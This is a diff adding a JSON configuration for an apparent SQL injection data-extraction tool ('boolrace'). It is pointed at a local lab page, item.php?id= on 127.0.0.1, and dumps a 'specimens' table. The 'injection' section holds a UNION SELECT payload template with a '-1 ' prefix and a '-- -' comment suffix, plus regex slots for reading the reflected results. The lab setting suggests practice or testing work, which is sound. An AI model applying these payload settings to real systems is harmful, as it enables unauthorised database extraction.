@@ -1,0 +1,79 @@
+{
+  "target": {
+    "base_url": "http://127.0.0.1:8099/item.php?id=",
+    "schema": "boolrace_lab",
+    "method": "GET",
+    "timeout": 10,
+    "verify_tls": true,
+    "keepalive": true,
+    "headers": {
+      "User-Agent": "boolrace-local-lab/0.1"
+    }
+  },
+  "injection": {
+    "prefix": "-1 ",
+    "suffix": "-- -",
+    "union_template": "{prefix}UNION SELECT {cols}{suffix}",
+    "keyword_obfuscation": null,
+    "ncols": 5,
+    "max_ncols": 5
+  },
+  "slots": {
+    "definitions": {
+      "title": {
+        "regex": "<title>(.*?)</title>",
+        "group": 1,
+        "index": 0
+      },
+      "p1": {
+        "regex": "<p>(.*?)</p>",
+        "group": 1,
+        "index": 0
+      },
+      "p2": {
+        "regex": "<p>(.*?)</p>",
+        "group": 1,
+        "index": 1
+      },
+      "p3": {
+        "regex": "<p>(.*?)</p>",
+        "group": 1,
+        "index": 2
+      },
+      "p4": {
+        "regex": "<p>(.*?)</p>",
+        "group": 1,
+        "index": 3
+      }
+    },
+    "probe_order": [
+      "title",
+      "p1",
+      "p2",
+      "p3",
+      "p4"
+    ]
+  },
+  "extraction": {
+    "mode": "compress",
+    "framing": "length",
+    "row_sep": "\u001f",
+    "null_marker": "\u0000NULL\u0000",
+    "chunk": 1024,
+    "workers": 1,
+    "throttle": 0.01,
+    "decode_html_entities": true,
+    "on_binary": "strict"
+  },
+  "tables": {
+    "specimens": [
+      "id",
+      "label",
+      "note",
+      "quantity"
+    ]
+  },
+  "output": {
+    "dir": "./boolrace_out/lab"
+  }
+}
